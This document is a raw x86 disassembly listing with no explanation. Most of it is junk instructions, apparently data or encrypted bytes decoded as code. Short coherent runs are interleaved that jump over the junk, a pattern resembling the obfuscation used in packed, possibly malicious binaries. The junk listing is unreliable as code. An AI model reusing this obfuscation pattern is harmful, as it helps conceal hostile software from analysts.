  4020b0:	sbb    cl,BYTE PTR [ebp-0x61]
  4020b3:	test   ebx,ebx
  4020b5:	xchg   edi,eax
  4020b6:	pop    ss
  4020b7:	xchg   DWORD PTR [edi],eax
  4020b9:	mov    dl,0x37
  4020bb:	mov    esp,0x48f5f295
  4020c0:	add    al,0x22
  4020c2:	sbb    eax,0x4c5a5e8a
  4020c7:	ins    BYTE PTR es:[edi],dx
  4020c8:	cs pop es
  4020ca:	imul   edx,DWORD PTR [ecx+0x42],0x2024a908
  4020d1:	xchg   ecx,eax
  4020d2:	loop   0x402142
  4020d4:	xchg   ebp,eax
  4020d5:	xchg   dl,bh
  4020d7:	aam    0x14
  4020d9:	in     al,dx
  4020da:	xchg   edi,eax
  4020db:	xchg   bh,bl
  4020dd:	mul    BYTE PTR [eax+0x580eb96d]
  4020e3:	ja     0x40214a
  4020e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020e6:	js     0x4020bf
  4020e8:	scas   al,BYTE PTR es:[edi]
  4020e9:	stos   BYTE PTR es:[edi],al
  4020ea:	pop    esp
  4020eb:	ficomp DWORD PTR [ebx+0x1c]
  4020ee:	int3   
  4020ef:	je     0x4020cf
  4020f1:	retf   
  4020f2:	repnz out 0x45,al
  4020f5:	je     0x402089
  4020f7:	leave  
  4020f8:	mov    ebp,0xab3e81b3
  4020fd:	inc    ebp
  4020fe:	icebp  
  4020ff:	test   DWORD PTR [ecx+ecx*1],ebx
  402102:	mov    esi,0xa3599f61
  402107:	xor    al,0x39
  402109:	add    DWORD PTR [ecx-0x69],ecx
  40210c:	inc    edx
  40210d:	inc    edi
  40210e:	jmp    0x402091
  402110:	inc    ecx
  402111:	sbb    esi,DWORD PTR [edx]
  402113:	xchg   ebx,eax
  402114:	jp     0x402141
  402116:	adc    eax,0x9d719d9d
  40211b:	idiv   DWORD PTR [edx+0x5094da0b]
  402121:	add    edx,DWORD PTR [ecx+0x43b3fddc]
  402127:	popf   
  402128:	mov    ebp,0xbcba6176
  40212d:	mov    dh,0xc1
  40212f:	aad    0xcd
  402131:	aam    0x9c
  402133:	lahf   
  402134:	aaa    
  402135:	lea    esi,[edi+0x32a2450a]
  40213b:	mov    edi,0xd6617f27
  402140:	xchg   ebp,eax
  402141:	repnz fild QWORD PTR [ebx+0x38]
  402145:	pop    ss
  402146:	jle    0x40218d
  402148:	out    dx,eax
  402149:	inc    ebp
  40214a:	aam    0x52
  40214c:	jo     0x402166
  40214e:	imul   edx,DWORD PTR [eax+edi*8+0x74],0x50
  402153:	cs mov esi,esi
  402156:	and    al,0xd2
  402158:	dec    esp
  402159:	lock sub DWORD PTR [edi+0x6d],esi
  40215d:	ss mov dl,0xa5
  402160:	add    BYTE PTR [ebx],0xa4
  402163:	leave  
  402164:	out    dx,al
  402165:	pop    esi
  402166:	in     eax,0xed
  402168:	push   ebx
  402169:	xchg   edi,esi
  40216b:	mov    dl,0xee
  40216d:	shl    BYTE PTR [ebx],1
  40216f:	mov    al,0x37
  402171:	inc    ebx
  402172:	cs and ah,bh
  402175:	(bad)  
  402176:	fwait
  402177:	mov    edi,DWORD PTR [ebx+0x1c]
  40217a:	addr16 push ds
  40217c:	fld    st(4)
  40217e:	xchg   al,dl
  402180:	sub    al,0x0
  402182:	sbb    esp,DWORD PTR [edi+eax*4+0x40]
  402186:	pop    edi
  402187:	ficom  DWORD PTR [edi+0x5fef612b]
  40218d:	fiadd  WORD PTR [edi+edi*1]
  402190:	js     0x40213b
  402192:	adc    BYTE PTR [ecx-0x43f0b25c],0xac
  402199:	outs   dx,BYTE PTR ds:[esi]
  40219a:	jns    0x40215e
  40219c:	xchg   DWORD PTR [esp+eiz*2+0x28f1cb82],edx
  4021a3:	inc    ebx
  4021a4:	js     0x4021d2
  4021a6:	push   ss
  4021a7:	cmp    dh,BYTE PTR [edx-0x78]
  4021aa:	pop    esi
  4021ab:	pop    ebp
  4021ac:	pop    ds
  4021ad:	sahf   
  4021ae:	mov    DWORD PTR [edi+eax*8],edi
  4021b1:	pop    esp
  4021b2:	in     al,0xbe
  4021b4:	push   edi
  4021b5:	les    edi,FWORD PTR [edi+esi*2]
  4021b8:	(bad)  
  4021b9:	je     0x4021fa
  4021bb:	pop    edx
  4021bc:	ds jg  0x402164
  4021bf:	mov    ah,0xe3
  4021c1:	and    eax,0x32478813
  4021c6:	cmc    
  4021c7:	mov    BYTE PTR [edi],dl
  4021c9:	addr16 xor al,0x21
  4021cc:	les    esi,FWORD PTR [edi+0x37]
  4021cf:	fs call 0xb4e3:0x1d14f9e9
  4021d7:	mov    DWORD PTR [esi-0x711a31e0],0xaf4061dc
  4021e1:	xchg   bh,dl
  4021e3:	nop
  4021e4:	push   ebx
  4021e5:	scas   al,BYTE PTR es:[edi]
  4021e6:	or     ch,dh
  4021e8:	or     edi,DWORD PTR [ebx-0x9]
  4021eb:	jno    0x402212
  4021ed:	dec    eax
  4021ee:	jae    0x4021cf
  4021f0:	mov    DWORD PTR ds:0xc1b7fda8,edx
  4021f6:	pop    es
  4021f7:	es xchg esi,eax
  4021f9:	fisubr WORD PTR [edi-0x80]
  4021fc:	cmp    eax,0x463e370e
  402201:	loopne 0x4021a6
  402203:	popa   
  402204:	mov    dl,0x31
  402206:	ret    
  402207:	mov    bh,0xe1
  402209:	inc    ecx
  40220a:	sbb    DWORD PTR [edi+0x64],esi
  40220d:	push   esp
  40220e:	ror    DWORD PTR [esi],1
  402210:	(bad)  
  402211:	test   eax,0x343c78a7
  402216:	mov    DWORD PTR [esi],0x41a24e8f
  40221c:	mov    eax,fs
  40221e:	fst    QWORD PTR [ecx]
  402220:	fbld   TBYTE PTR [edi+0x7be6ebac]
  402226:	(bad)  [edx+eiz*1-0x63]
  40222a:	test   al,0x66
  40222c:	pop    ebx
  40222d:	dec    edi
  40222e:	jne    0x402275
  402230:	mov    ds:0xc28b2293,al
  402235:	test   al,0x98
  402237:	stos   DWORD PTR es:[edi],eax
  402238:	rdpmc  
  40223a:	mov    ch,0xe
  40223c:	(bad)  
  40223d:	cli    
  40223e:	retf   
  40223f:	push   ecx
  402240:	inc    ebx
  402241:	bound  ebx,QWORD PTR [ecx+0x408f2b55]
  402247:	pushf  
  402248:	and    eax,DWORD PTR [esi]
  40224a:	xchg   ebp,eax
  40224b:	rcl    DWORD PTR [edi],1
  40224d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40224e:	fs adc cl,dl
  402251:	add    DWORD PTR [ebp+eiz*8-0x1],eax
  402255:	xchg   esp,eax
  402256:	add    eax,0x6f4b2be0
  40225b:	mov    ebp,0xd059df57
  402260:	pop    esp
  402261:	mov    ebx,edi
  402263:	cmp    DWORD PTR ds:0xe31c4a0a,ebx
  402269:	and    BYTE PTR [edi-0x65305d8f],bl
  40226f:	out    0x14,al
  402271:	shr    DWORD PTR [ecx],0xa0
  402274:	xchg   eax,edx
  402276:	or     al,0xde
  402278:	outs   dx,DWORD PTR ds:[esi]
  402279:	ret    
  40227a:	sbb    BYTE PTR [eax+eax*4],ah
  40227d:	inc    edx
  40227e:	popa   
  40227f:	mov    ds:0xef115e4,al
  402284:	ss cmc 
  402286:	lods   eax,DWORD PTR ds:[esi]
  402287:	jge    0x402281
  402289:	cmp    eax,0xb4f72f2f
  40228e:	inc    esp
  40228f:	xchg   DWORD PTR [ebx],edi
  402291:	or     ch,BYTE PTR gs:[eax-0x2c]
  402295:	arpl   WORD PTR [ecx+0x71],dx
  402298:	cmovne ebx,DWORD PTR [esp+edi*1]
  40229c:	or     BYTE PTR [eax-0x74],bh
  40229f:	jge    0x40223c
  4022a1:	addr16 popa 
  4022a3:	das    
  4022a4:	dec    edx
  4022a5:	xor    eax,esi
  4022a7:	and    DWORD PTR ds:0x42a771,0x42a7b5
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0x7a682c5b
  4022e1:	(bad)  
  4022e2:	adc    edi,ecx
  4022e4:	add    al,0x9
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402310
  4022ed:	or     bh,BYTE PTR [edi]
  4022ef:	adc    DWORD PTR [ebx-0x251c923b],0xffffff83
  4022f6:	pop    ebp
  4022f7:	neg    ch
  4022f9:	int3   
  4022fa:	inc    ecx
  4022fb:	(bad)  
  4022fc:	jge    0x4022dd
  4022fe:	adc    al,0x2a
  402300:	pop    ss
  402301:	jp     0x40232b
  402303:	dec    ebp
  402304:	mov    edi,0x8c18e586
  402309:	push   ecx
  40230a:	gs sbb al,0x3b
  40230d:	(bad)  [ebp+0x24f75e1e]
  402313:	inc    ebx
  402314:	pop    eax
  402315:	push   edx
  402316:	dec    ebp
  402317:	sbb    eax,0x5b616aa7
  40231c:	cmp    BYTE PTR [eax],ah
  40231e:	sbb    DWORD PTR [esi-0x38ade2a3],ebp
  402324:	or     BYTE PTR [ebp-0x57],dl
  402327:	(bad)  
  402328:	popa   
  402329:	(bad)  
  40232a:	mov    ds:0xf25174f4,eax
  40232f:	push   ebp
  402330:	popf   
  402331:	mov    DWORD PTR [eax+0x39f23957],esp
  402337:	sub    eax,0xc1e2302b
  40233c:	aas    
  40233d:	outs   dx,DWORD PTR ds:[esi]
  40233e:	or     BYTE PTR [ecx+eax*8+0x54d32c8f],al
  402345:	(bad)  
  402346:	dec    edx
  402347:	or     ebx,edi
  402349:	xor    eax,0xcc0c4168
  40234e:	add    eax,DWORD PTR [ebx]
  402350:	pushf  
  402351:	jns    0x40237c
  402353:	(bad)  
  402354:	js     0x40239e
  402356:	jne    0x4023d5
  402358:	push   ebx
  402359:	sbb    ch,BYTE PTR [eax-0x3fd45c18]
  40235f:	mov    dl,0xb4
  402361:	stos   DWORD PTR es:[edi],eax
  402362:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402364:	(bad)  
  402365:	xor    BYTE PTR [edx+0x7f],0x1
  402369:	xor    DWORD PTR [ecx+0x6cef2edd],0x71
  402370:	mul    ah
  402372:	cmp    eax,DWORD PTR [esp+edx*1-0x2]
  402376:	sti    
  402377:	in     eax,0x41
  402379:	inc    edx
  40237a:	mov    ah,0x38
  40237c:	or     al,0x3
  40237e:	xchg   esp,eax
  40237f:	sbb    eax,0x53eaeded
  402384:	mov    ebp,0x6bf8814b
  402389:	call   0x5c71:0x82401358
  402390:	dec    edx
  402391:	jp     0x4023e2
  402393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402394:	sbb    BYTE PTR [ebx-0x7aa96a6c],cl
  40239a:	push   es
  40239b:	test   al,0x5d
  40239d:	stos   BYTE PTR es:[edi],al
  40239e:	push   0x6c
  4023a0:	int3   
  4023a1:	jmp    0x4023ef
  4023a3:	push   esi
  4023a4:	xor    ch,BYTE PTR [esi+eiz*1-0x4f]
  4023a8:	mov    al,dh
  4023aa:	jno    0x402343
  4023ac:	xchg   ebx,eax
  4023ad:	scas   al,BYTE PTR es:[edi]
  4023ae:	cdq    
  4023af:	stc    
  4023b0:	adc    dl,BYTE PTR [edi-0x7]
  4023b3:	cli    
  4023b4:	jns    0x40240f
  4023b6:	sub    DWORD PTR [esi-0x72],ebp
  4023b9:	jmp    0x402346
  4023bb:	retf   
  4023bc:	in     al,dx
  4023bd:	jle    0x4023a5
  4023bf:	jae    0x402401
  4023c1:	adc    ah,BYTE PTR [eax-0x50]
  4023c4:	xor    ch,ah
  4023c6:	pop    ecx
  4023c7:	fimul  DWORD PTR [ecx]
  4023c9:	dec    ebx
  4023ca:	push   ebp
  4023cb:	into   
  4023cc:	or     BYTE PTR [esi-0x3af2147d],bl
  4023d2:	mov    ds:0x6f4fd9b0,eax
  4023d7:	and    BYTE PTR [esp+ecx*4],ah
  4023da:	int    0xc6
  4023dc:	mov    esi,0x7345c737
  4023e1:	mov    al,0xaf
  4023e3:	shr    bh,cl
  4023e5:	fdiv   QWORD PTR [edx-0xd304eb2]
  4023eb:	clc    
  4023ec:	inc    ebp
  4023ed:	mov    ebx,0x5fedba68
  4023f2:	ret    
  4023f3:	mov    al,0x22
  4023f5:	and    bh,dl
  4023f7:	xchg   esp,eax
  4023f8:	sub    eax,0x5cd1b43a
  4023fd:	and    cx,0xed05
  402402:	sub    DWORD PTR [edi-0x7ffb5429],ebp
  402408:	jns    0x402454
  40240a:	dec    edi
  40240b:	xor    DWORD PTR [eax],ebx
  40240d:	cld    
  40240e:	sbb    eax,0xd20dbc3b
  402413:	sub    DWORD PTR [esi+0x7f06ae61],eax
  402419:	xor    edi,eax
  40241b:	and    bl,BYTE PTR [ebx]
  40241d:	pop    esp
  40241e:	or     bh,BYTE PTR [ebx+0x77]
  402421:	dec    esp
  402422:	int    0x4f
  402424:	test   BYTE PTR [ebx+ebx*4-0x52],dl
  402428:	or     cl,bl
  40242a:	int3   
  40242b:	into   
  40242c:	ins    DWORD PTR es:[edi],dx
  40242d:	aas    
  40242e:	fld    QWORD PTR [ecx-0x59]
  402431:	or     ecx,DWORD PTR [ebx-0x2920021]
  402437:	sub    edx,DWORD PTR [ebp+0x57]
  40243a:	in     eax,dx
  40243b:	or     BYTE PTR [esi],bh
  40243d:	mov    WORD PTR [edx],?
  40243f:	jbe    0x402468
  402441:	jno    0x4024a6
  402443:	adc    al,0xe9
  402445:	sub    BYTE PTR [ecx+0x4f5cdf7a],0x4a
  40244c:	stos   BYTE PTR es:[edi],al
  40244d:	in     al,dx
  40244e:	jae    0x402437
  402450:	cmp    cl,BYTE PTR [ecx-0x16790769]
  402456:	ror    ebx,0x51
  402459:	popa   
  40245a:	xchg   ebx,eax
  40245b:	jl     0x4024a3
  40245d:	shl    cl,cl
  40245f:	mov    ah,0xe0
  402461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402462:	inc    ebp
  402463:	in     eax,dx
  402464:	xchg   ecx,eax
  402465:	ficom  DWORD PTR [edi-0x4e]
  402468:	mov    BYTE PTR [eax+0x39],bl
  40246b:	add    al,0xe1
  40246d:	dec    ebx
  40246e:	and    ah,al
  402470:	xchg   ebx,eax
  402471:	es loopne 0x4024d4
  402474:	out    dx,eax
  402475:	cs jae 0x402446
  402478:	jle    0x402486
  40247a:	popf   
  40247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40247c:	jecxz  0x40249c
  40247e:	mov    al,cl
  402480:	xchg   ecx,eax
  402481:	jp     0x402495
  402483:	jmp    0x18158113
  402488:	out    dx,al
  402489:	sub    BYTE PTR [ebx+0x60],0x61
  40248d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40248e:	retf   0x867
  402491:	mov    ch,al
  402493:	push   es
  402494:	inc    eax
  402495:	and    esp,ebx
  402497:	xor    al,0x1e
  402499:	sbb    DWORD PTR [eax+0x46],0xffffffd4
  40249d:	pop    ecx
  40249e:	aad    0xc8
  4024a0:	cmp    eax,0xac6372d3
  4024a5:	ret    0xe6ca
  4024a8:	je     0x4024df
  4024aa:	cli    
  4024ab:	mov    bh,0x15
  4024ad:	popf   
  4024ae:	adc    eax,0xf936048c
  4024b3:	call   0xa4013c8d
  4024b8:	js     0x40250a
  4024ba:	icebp  
  4024bb:	mov    dh,0xe1
  4024bd:	push   ss
  4024be:	and    ebx,ebx
  4024c0:	dec    ecx
  4024c1:	xlat   BYTE PTR ds:[ebx]
  4024c2:	mov    ecx,0x2cd77f2d
  4024c7:	in     al,dx
  4024c8:	mov    esp,0x79b926d7
  4024cd:	jge    0x4024ba
  4024cf:	lods   al,BYTE PTR ds:[esi]
  4024d0:	sti    
  4024d1:	fst    QWORD PTR [esi+0x24]
  4024d4:	xor    al,0x26
  4024d6:	add    al,0x3
  4024d8:	xlat   BYTE PTR ds:[ebx]
  4024d9:	push   esp
  4024da:	sbb    edi,DWORD PTR [edx+0x7202de25]
  4024e0:	dec    ebp
  4024e1:	jmp    0x40250f
  4024e3:	push   eax
  4024e4:	fs aas 
  4024e6:	test   al,0xe8
  4024e8:	ins    BYTE PTR es:[edi],dx
  4024e9:	ins    DWORD PTR es:[edi],dx
  4024ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024eb:	jne    0x4024cb
  4024ed:	mov    edx,0xa51a09f
  4024f2:	jp     0x4024fd
  4024f4:	mov    dl,0xbb
  4024f6:	or     al,BYTE PTR [ebx-0x6ea5e85c]
  4024fc:	inc    edx
  4024fd:	or     esp,DWORD PTR [ebx]
  4024ff:	xchg   esi,eax
  402500:	pop    ebp
  402501:	imul   edx,DWORD PTR [ecx],0xbaaafdbf
  402507:	xchg   edi,eax
  402508:	sahf   
  402509:	mov    ds:0x6148c509,eax
  40250e:	mov    esi,ecx
  402510:	icebp  
  402511:	jb     0x402578
  402513:	dec    esp
  402514:	mov    ah,0x75
  402516:	jmp    0x4024a5
  402518:	pop    es
  402519:	cmc    
  40251a:	fnstenv [edi+0x322bb2df]
  402520:	add    esp,DWORD PTR [esi]
  402522:	xchg   edi,eax
  402523:	lods   al,BYTE PTR ds:[esi]
  402524:	and    BYTE PTR [ebp+0xc0f34c0],bh
  40252a:	cmp    BYTE PTR ss:[esi],cl
  40252d:	pop    ds
  40252e:	push   ebx
  40252f:	ds sub eax,0xf6f8b471
  402535:	popfw  
  402537:	cmp    DWORD PTR [ecx-0x1d15b4cc],eax
  40253d:	sub    BYTE PTR [edi-0x38],0xc5
  402541:	add    ebp,DWORD PTR [eax]
  402543:	out    dx,al
  402544:	jmp    0xbf332161
  402549:	adc    eax,DWORD PTR [ecx+0x21]
  40254c:	aas    
  40254d:	lods   eax,DWORD PTR ds:[esi]
  40254e:	dec    ebp
  40254f:	xchg   ecx,eax
  402550:	call   0xa8a1f385
  402555:	fwait
  402556:	sar    DWORD PTR ds:0xcd9141b8,0x3d
  40255d:	and    al,0xb9
  40255f:	cwde   
  402560:	inc    esp
  402562:	xchg   esi,eax
  402563:	inc    DWORD PTR [edi+0x335d3ae0]
  402569:	xchg   edi,eax
  40256a:	add    edi,esi
  40256c:	or     DWORD PTR [edi],edi
  40256e:	cmp    DWORD PTR [ecx],eax
  402570:	jne    0x402832
  402576:	mov    eax,DWORD PTR [ebp+0x8]
  402579:	mov    ecx,DWORD PTR [ebp-0x10]
  40257c:	xor    eax,esi
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	dec    eax
  402594:	repnz in al,0x36
  402597:	mov    cl,BYTE PTR [edi]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x40252a
  4025a0:	adc    eax,0x32442700
  4025a5:	shr    BYTE PTR [esi-0x25],1
  4025a8:	sub    bh,bh
  4025aa:	sub    DWORD PTR [ecx],ecx
  4025ac:	push   DWORD PTR ds:0xd7de437f
  4025b2:	call   0xcd24:0xbc48fae2
  4025b9:	pushf  
  4025ba:	std    
  4025bb:	push   es
  4025bc:	in     eax,0x13
  4025be:	imul   edi,DWORD PTR [esi],0xffffffd9
  4025c1:	(bad)  [eax]
  4025c3:	neg    BYTE PTR [edx-0x3969c647]
  4025c9:	int    0xb4
  4025cb:	pushf  
  4025cc:	lea    eax,[edi]
  4025ce:	(bad)  
  4025cf:	fstp   DWORD PTR [ebx]
  4025d1:	mov    dh,BYTE PTR [esi+0x6605dbeb]
  4025d7:	jg     0x40261a
  4025d9:	fwait
  4025da:	jl     0x402623
  4025dc:	mov    esi,0x655be06e
  4025e1:	sub    eax,0x7a490604
  4025e6:	iret   
  4025e7:	test   BYTE PTR [ebp+0x6a8a760a],ch
  4025ed:	(bad)  
  4025ef:	xchg   ecx,eax
  4025f0:	mov    esi,0x27415d82
  4025f5:	test   DWORD PTR [edi-0x63],edi
  4025f8:	out    0xf1,al
  4025fa:	test   eax,0x48a173dd
  4025ff:	and    BYTE PTR [esi+0x328230fd],cl
  402605:	enter  0xca92,0x73
  402609:	enter  0x12a2,0xf5
  40260d:	pop    eax
  40260e:	loop   0x402603
  402610:	fs out 0x7b,eax
  402613:	pop    edi
  402614:	cwde   
  402615:	dec    ebx
  402616:	xor    ebx,esp
  402618:	(bad)  [eax-0x2ae3d5b]
  40261e:	push   eax
  40261f:	xchg   edi,eax
  402620:	mov    edx,0x40ca1fd3
  402625:	sbb    dh,BYTE PTR [ebx+eax*4+0x57]
  402629:	jne    0x40260a
  40262b:	enter  0xe431,0xec
  40262f:	test   DWORD PTR [edx-0x18fe9ae1],ecx
  402635:	xchg   edx,eax
  402636:	or     ebx,edx
  402638:	les    edx,FWORD PTR [edx]
  40263a:	scas   eax,DWORD PTR es:[edi]
  40263b:	cld    
  40263c:	jle    0x402662
  40263e:	into   
  40263f:	cli    
  402640:	int    0x28
  402642:	adc    eax,0x6662d2fd
  402647:	fcmove st,st(3)
  40264a:	add    eax,0x28b511c7
  40264f:	dec    esi
  402650:	pushf  
  402651:	ja     0x4025eb
  402653:	push   cs
  402654:	and    DWORD PTR [edi+eax*4-0x6978fece],esi
  40265b:	adc    al,0xf2
  40265d:	push   edx
  40265e:	shl    dh,cl
  402660:	bound  eax,QWORD PTR [edi-0x15921061]
  402666:	sbb    BYTE PTR [esi+edx*2+0x711b74d2],bh
  40266d:	cdq    
  40266e:	js     0x40262e
  402670:	pop    ss
  402671:	ds pop ss
  402673:	arpl   bp,bp
  402675:	dec    ebp
  402676:	jae    0x402667
  402678:	ja     0x1493d8bd
  40267e:	push   cs
  40267f:	xor    bl,BYTE PTR [edx]
  402681:	fwait
  402682:	mov    al,ds:0xf037e04b
  402687:	inc    ecx
  402688:	repnz cmp ebp,DWORD PTR [edi+edi*2-0x75aeaed7]
  402690:	lods   eax,DWORD PTR ds:[esi]
  402691:	in     eax,0xb9
  402693:	or     esp,0xc0f40b6a
  402699:	xor    BYTE PTR [edi],dh
  40269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40269c:	dec    edx
  40269d:	ja     0x40266a
  40269f:	xchg   al,dh
  4026a1:	xlat   BYTE PTR ds:[ebx]
  4026a2:	shl    DWORD PTR [esi-0x2e74f4ad],cl
  4026a8:	arpl   dx,bx
  4026aa:	cdq    
  4026ab:	rol    dl,1
  4026ad:	(bad)  
  4026ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026af:	xchg   edi,eax
  4026b0:	(bad)  
  4026b1:	shr    BYTE PTR [edi],cl
  4026b3:	jmp    0x40611ac2
  4026b8:	push   ss
  4026b9:	daa    
  4026ba:	repz cmp DWORD PTR [esi-0x4b],0xffffff87
  4026bf:	add    DWORD PTR [edx],edi
  4026c1:	sbb    BYTE PTR [esi-0x255869b1],bh
  4026c7:	xor    BYTE PTR [edx],0x52
  4026ca:	ja     0x4026dc
  4026cc:	inc    esi
  4026cd:	xchg   edi,eax
  4026ce:	xor    cl,cl
  4026d0:	and    eax,0x6ba949c9
  4026d5:	fist   DWORD PTR [esi-0x26]
  4026d8:	or     BYTE PTR [eax-0x55b25889],bl
  4026de:	jno    0x402726
  4026e0:	or     al,0x3b
  4026e2:	mov    esp,0x98272b6c
  4026e7:	test   DWORD PTR [eax-0x4474b1e],edi
  4026ed:	popf   
  4026ee:	push   0x4e
  4026f0:	fwait
  4026f1:	jo     0x4026f1
  4026f3:	repnz pop ebp
  4026f5:	fild   WORD PTR [ebp+0x401d41ad]
  4026fb:	(bad)  
  4026fc:	xchg   esp,eax
  4026fd:	call   FWORD PTR [edi]
  4026ff:	xlat   BYTE PTR ds:[ebx]
  402700:	xchg   BYTE PTR [ebx+0x77f8bcf5],dh
  402706:	cli    
  402707:	sbb    al,0xfc
  402709:	mov    bl,0x7
  40270b:	(bad)  
  40270c:	call   0xa4f31328
  402711:	xchg   edx,eax
  402712:	xor    DWORD PTR [edx-0x586e630e],0xce7a3394
  40271c:	or     eax,0xec196b71
  402721:	dec    edi
  402722:	dec    ebp
  402723:	sti    
  402724:	mov    WORD PTR [edx+esi*4+0x78f5714f],gs
  40272b:	sbb    edx,DWORD PTR ds:0xa0d19b58
  402731:	imul   ebp,DWORD PTR [ebp-0x64de7afe],0x1051a26b
  40273b:	sub    edi,ebx
  40273d:	cs mov ebp,0x56e7a0b
  402743:	pop    edx
  402744:	pop    ds
  402745:	xor    eax,0xd8d84ed9
  40274a:	cs inc ecx
  40274c:	rcl    BYTE PTR [eax+0x7074e1f5],1
  402752:	cmc    
  402753:	stc    
  402754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402755:	popa   
  402756:	pop    eax
  402757:	in     eax,0x66
  402759:	mov    al,0x8a
  40275b:	jl     0x40273b
  40275d:	and    BYTE PTR [ecx+0x2c98de55],0xd5
  402764:	jb     0x40275a
  402766:	out    dx,eax
  402767:	add    eax,0x5514b290
  40276c:	mov    ebp,DWORD PTR [edx+0x1b]
  40276f:	ds dec esi
  402771:	aaa    
  402772:	lds    ebp,FWORD PTR [edx]
  402774:	outs   dx,DWORD PTR ds:[esi]
  402775:	leave  
  402776:	stc    
  402777:	or     DWORD PTR [ebx+ebp*4],eax
  40277a:	mov    al,ds:0xe5d9d492
  40277f:	add    al,0x69
  402781:	add    DWORD PTR [ebp+0x6db86c3d],esi
  402787:	mov    ecx,0xad2656cc
  40278c:	test   al,0x3c
  40278e:	ror    DWORD PTR [ebp-0x5370da94],cl
  402794:	sub    DWORD PTR [edi+0x2c9a5873],ebp
  40279a:	stc    
  40279b:	sub    DWORD PTR [ebx],ecx
  40279d:	es lahf 
  40279f:	pop    ss
  4027a0:	jl     0x402741
  4027a2:	clc    
  4027a3:	dec    DWORD PTR ss:[eax+0x44]
  4027a7:	jecxz  0x402804
  4027a9:	inc    edx
  4027aa:	cmp    BYTE PTR ds:0xcdeb536a,cl
  4027b0:	aam    0x96
  4027b2:	stos   BYTE PTR es:[edi],al
  4027b3:	push   ebp
  4027b4:	lock xchg esp,eax
  4027b6:	dec    edi
  4027b7:	fld    st(1)
  4027b9:	jl     0x40282f
  4027bb:	jo     0x402755
  4027bd:	nop
  4027be:	shl    BYTE PTR [edi],cl
  4027c0:	das    
  4027c1:	push   esp
  4027c2:	xchg   ebp,eax
  4027c3:	ds push ebx
  4027c5:	jns    0x4027f3
  4027c7:	int    0x39
  4027c9:	outs   dx,BYTE PTR ds:[esi]
  4027ca:	xor    BYTE PTR [eax+0x5e],al
  4027cd:	retf   0xbf6b
  4027d0:	or     eax,0x6d8781d0
  4027d5:	dec    edx
  4027d6:	add    eax,0xf6712db5
  4027db:	ficomp WORD PTR [ebx]
  4027dd:	into   
  4027de:	loop   0x40277b
  4027e0:	xor    al,0x76
  4027e2:	jbe    0x402853
  4027e4:	xchg   BYTE PTR [ebp-0x40],dl
  4027e7:	sbb    esp,DWORD PTR [edi+0x483d5583]
  4027ed:	out    dx,al
  4027ee:	sahf   
  4027ef:	pop    esi
  4027f0:	xchg   edx,eax
  4027f1:	jmp    0x76aa7b09
  4027f6:	jb     0x4027d9
  4027f8:	rcl    BYTE PTR [esi-0x25],1
  4027fb:	sub    BYTE PTR [eax+0xc],bl
  4027fe:	adc    al,0x2d
  402800:	push   ss
  402801:	lock jbe 0x4027ee
  402804:	mov    BYTE PTR [ebp+eiz*2+0x276deac7],al
  40280b:	fldcw  WORD PTR [ebx]
  40280d:	fisubr WORD PTR [edi*1+0xc7cf112]
  402814:	in     eax,dx
  402815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402816:	push   edx
  402817:	call   0x2ef0:0xe513acc7
  40281e:	push   ebx
  40281f:	fcmovu st,st(5)
  402821:	mov    eax,DWORD PTR [ebp-0x10]
  402824:	mov    ecx,DWORD PTR [ebp+0x10]
  402827:	xor    ecx,esi
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402882:	js     0x402867
  402884:	pop    ss
  402885:	or     BYTE PTR [eax+edi*2],cl
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x4028ef
  40288e:	loope  0x402852
  402890:	fidivr WORD PTR [ebp-0x45]
